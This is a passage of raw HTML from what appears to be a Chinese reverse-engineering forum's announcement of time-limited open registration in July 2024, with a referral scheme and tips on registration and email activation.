style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">习</span><span style="display: inline-block; text-indent: initial;">交</span><span style="display: inline-block; text-indent: initial;">流</span></span><span><span style="display: inline-block; text-indent: initial;">逆</span><span style="display: inline-block; text-indent: initial;">向</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">析</span></span><span><span style="display: inline-block; text-indent: initial;">技</span><span style="display: inline-block; text-indent: initial;">术</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">生</span><span style="display: inline-block; text-indent: initial;">血</span><span style="display: inline-block; text-indent: initial;">液</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">商</span><span style="display: inline-block; text-indent: initial;">议</span><span style="display: inline-block; text-indent: initial;">决</span><span style="display: inline-block; text-indent: initial;">定</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span></span><span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span><span style="display: inline-block; text-indent: initial;">。</span></span></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">随</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">签</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">C</span><span style="display: inline-block; text-indent: initial;">B</span><span style="display: inline-block; text-indent: initial;">！</span></span></strong></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">避</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">由</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">负</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">影</span><span style="display: inline-block; text-indent: initial;">响</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">强</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">从</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">况</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">采</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">严</span><span style="display: inline-block; text-indent: initial;">格</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">措</span><span style="display: inline-block; text-indent: initial;">施</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">您</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">真</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">须</span><span style="display: inline-block; text-indent: initial;">知</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">及</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">适</span><span style="display: inline-block; text-indent: initial;">应</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">享</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">24</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">7</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">21</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span></span></strong><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span></span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">得</span><span style="display: inline-block; text-indent: initial;">贡</span><span style="display: inline-block; text-indent: initial;">献</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="font-size: 14px; font-weight: 700;">大家可以推荐自己的朋友注册</span>，从而增加自己的<span style="font-size: 14px; font-weight: 700;">贡献值</span>，只要通过你推荐的地址注册，你就会增加一个贡献值，注册完可以炫耀一下贡献值啦，你可以把我的账号改成你的账号就是你的推广地址啦，比如我的推广地址可以是以下链接：</span></p><blockquote style="margin-top: 0px; margin-bottom: 0px; color: rgb(106, 115, 125); padding-top: 0px; padding-right: 1em; padding-left: 1em; border-left-width: 0.25em; border-left-color: rgb(223, 226, 229);"><p style="margin-bottom: 15px;"><span style="font-size: 14px;">https://www.52pojie.cn/?fromuser=LCG</span><span style="font-size: 14px;"> 【把LCG换成自己的账号即可】</span></p><p><span style="font-size: 14px;">https://www.52pojie.cn/?fromuid=14</span><span style="font-size: 14px;"> 【把14换成自己的UID即可，UID查看：</span><span style="font-size: 14px;">https://www.52pojie.cn/home.php?mod=space&amp;do=profile</span><span style="font-size: 14px;"> 】</span></p></blockquote></li></ul><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">备</span><span style="display: inline-block; text-indent: initial;">什</span><span style="display: inline-block; text-indent: initial;">么</span><span style="display: inline-block; text-indent: initial;">？</span></span></h2><ol class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">优</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;"> </span><strong style="line-height: 1.6;"><span style="color: rgb(255, 0, 0); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">异</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">待</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span></span></strong><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">址</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">选</span><span style="display: inline-block; text-indent: initial;">择</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">页</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">E</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">l</span><span style="display: inline-block; text-indent: initial;">栏</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">示</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">预</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">独</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">二</span><span style="display: inline-block; text-indent: initial;">！</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">系</span><span style="display: inline-block; text-indent: initial;">统</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">包</span><span style="display: inline-block; text-indent: initial;">括</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">钟</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">造</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">空</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">浏</span><span style="display: inline-block; text-indent: initial;">览</span><span style="display: inline-block; text-indent: initial;">器</span><span style="display: inline-block; text-indent: initial;">缓</span><span style="display: inline-block; text-indent: initial;">存</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">k</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">三</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">做</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">重</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">四</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="line-height: 1.6;"><span style="color: rgb(0, 0, 255); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">域</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">白</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">单</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">误</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: 